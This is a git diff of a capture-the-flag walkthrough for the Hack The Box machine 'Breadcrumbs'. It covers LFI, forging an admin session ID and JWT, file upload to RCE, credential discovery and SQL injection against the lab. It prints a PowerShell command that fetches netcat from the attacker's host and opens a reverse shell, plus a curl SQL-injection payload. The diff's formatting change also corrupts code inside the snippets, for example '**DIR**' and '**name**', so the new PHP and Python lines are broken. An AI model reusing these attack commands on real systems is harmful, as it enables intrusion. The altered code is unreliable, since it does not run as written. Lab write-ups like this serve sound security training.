@@ -5,9 +5,9 @@
 
 # Enumeration
 
-__IP-ADDR:__ 10.10.10.228 breadcrumbs.htb
+**IP-ADDR:** 10.10.10.228 breadcrumbs.htb
 
-__nmap scan:__
+**nmap scan:**
 ```bash
 PORT      STATE SERVICE       VERSION
 22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
@@ -82,7 +82,9 @@ adding `book` post parameter and send the request and its value appere in the `f
 
 ![](screenshots/add-book.png)
 
-### LFI
+# Foothold
+
+## LFI
 
 Try to include server `../includes/bookController.php` file to check lfi and Get `bookController.php` file.
 
@@ -131,7 +133,7 @@ def lfi(file):
 print(lfi(sys.argv[1])[1:-1])
 ```
 
-## webapp: portal
+### Portal
 
 Running Gobuster found `/portal`, which redirect to `/portal/login.php`
 
@@ -149,7 +151,7 @@ replacing `method` value to `1` return error from `\portal\authController.php`. 
 
 After reading `authController.php`, some things which i understand.
 
-1. There are two methods of login. `$_POST['method'] == 1` uses username and passowrd for __signup__. `$_POST['method'] == 0` use username and password for __login__ and set php session cookie and jwt token.
+1. There are two methods of login. `$_POST['method'] == 1` uses username and passowrd for **signup**. `$_POST['method'] == 0` use username and password for **login** and set php session cookie and jwt token.
 2. php session cookie generated manually from `cookie.php` file.
 
     ![](screenshots/cookie-code.png)
@@ -170,7 +172,7 @@ After reading `authController.php`, some things which i understand.
 
 From user Dashboard, get bunch of locations, but there is only one location "File management" `/portal/php/files.php` which redirect to `index.php`.
 
-View that file source code with lfi, found that it is __only accessible by user "paul"__, who is the admin and __this file have file upload option__.
+View that file source code with lfi, found that it is **only accessible by user "paul"**, who is the admin and **this file have file upload option**.
 
 ![](screenshots/files-php.png)
 
@@ -178,16 +180,16 @@ View that file source code with lfi, found that it is __only accessible by user 
 
 ![](screenshots/files-js.png)
 
-`/includes/fileController.php` is checking if requested user is user "paul" or not by __decoding requested session's jwt token__ and __session's username__. If it is equal to "paul" than upload file in `/portal/uploads/` directory. 
+`/includes/fileController.php` is checking if requested user is user "paul" or not by **decoding requested session's jwt token** and **session's username**. If it is equal to "paul" than upload file in `/portal/uploads/` directory. 
 
 ![](screenshots/file-control.png)
 
 
-# Foothold:File_upload_to_RCE
+## File upload to RCE
 
-__First,__ generate user "paul" php session id. Because of the length of the user "paul" there are 4 possible session ids and 1/16 chances of login as user "paul".
+**First,** generate user "paul" php session id. Because of the length of the user "paul" there are 4 possible session ids and 1/16 chances of login as user "paul".
 
-__Second,__ Generate jwt token for user "paul". This is always same because there only 1 static value in the payload.
+**Second,** Generate jwt token for user "paul". This is always same because there only 1 static value in the payload.
 
 Here is php script to generate session ID and jwt token.
 ```php
@@ -197,7 +199,7 @@ Here is php script to generate session ID and jwt token.
 First run "composer require firebase/php-jwt"
 */
 
-require __DIR__ . '/vendor/autoload.php';
+require **DIR** . '/vendor/autoload.php';
 use Firebase\JWT\JWT;
 
 $username = "paul";
@@ -316,7 +318,7 @@ parser.add_argument("-f", help="uploaded file name without Extension")
 parser.add_argument("-c", help="windows cmd Command")
 args = parser.parse_args()
 
-if  __name__ == "__main__":
+if  **name** == "**main**":
     try:
         if args.u:
             upload_file()
@@ -331,7 +333,7 @@ if  __name__ == "__main__":
         print('User has exited the program')
 ```
 
-__Getting Reverse shell__ by uploading netcat on the nbox.
+**Getting Reverse shell** by uploading netcat on the nbox.
 ```bash
 powershell IWR -uri http://10.10.15.71/nc64.exe -OutFile C:\\windows\\temp\\nc64.exe
 cmd /c c:\\windows\\temp\\nc64.exe 10.10.0.4 4141 -e powershell.exe
@@ -339,7 +341,7 @@ cmd /c c:\\windows\\temp\\nc64.exe 10.10.0.4 4141 -e powershell.exe
 
 ![](screenshots/rev-shell.png)
 
-# Privesc:Horizontal
+# Privesc
 
 2 user on the box.
 
@@ -354,7 +356,7 @@ ssh with found creds.
 
 ![](screenshots/ssh-user.png)
 
-## stickynotes backups
+## Stickynotes backups
 
 inside user "" home folder there is a `todo.html` in "Desktop" folder
 
@@ -374,7 +376,7 @@ cp <filename> \\10.10.15.71\smb
 
 ![](screenshots/smb-transfer.png)
 
-I Really don't know how to open these file in linux but running strings over "plum.sqlite-wal" found "development" user's (looks like a) password
+running strings over "plum.sqlite-wal" found "development" user's (looks like a) password
 ```bash
 ❯ strings plum.sqlite-wal| grep development | tail -n1
 \id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
@@ -413,9 +415,9 @@ selectarray(1) {
 }
 ```
 
-Got the aes key: `k19D193j.<19391(`
+## sql injection
 
-Found sql injection in "username" parameter.
+After test url parameters, Found sql injection in "username" parameter.
 ```bash
 ❯ curl "http://127.0.0.1:1234/index.php?method=select&username=administrator'+OR+1=1+--+-&table=passwords"
 selectarray(1) {
